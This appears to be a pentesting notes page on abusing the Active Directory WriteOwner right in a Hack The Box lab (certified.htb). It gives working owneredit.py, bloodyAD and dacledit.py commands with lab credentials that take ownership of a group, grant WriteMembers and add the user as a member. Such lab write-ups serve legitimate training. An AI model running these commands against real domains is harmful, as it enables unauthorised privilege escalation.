---
description: WriteOwner Abuse
---

# WriteOwner

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

First we add `judith.mader` as owner to Management group.

{% code overflow="wrap" %}
```bash
owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'

# With password
bloodyAD -u judith.mader -p judith09 -d certified.htb --host 10.129.68.162 set owner MANAGEMENT judith.mader

# With Kerberos (no NTLM)
bloodyAD -u judith.mader -k -d certified.htb --host dc01.certified.htb set owner MANAGEMENT judith.mader

```
{% endcode %}

Since we now own the group, we can now give the user permission to add members via _dacledit_

{% code overflow="wrap" %}
```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```
{% endcode %}

After that we add `judith.mader` as member to the `Management` group.

{% code overflow="wrap" %}
```bash
bloodyAD -u judith.mader -p judith09 -d certified.htb --host 10.129.68.162 add groupMember MANAGEMENT judith.mader
```
{% endcode %}

<br>
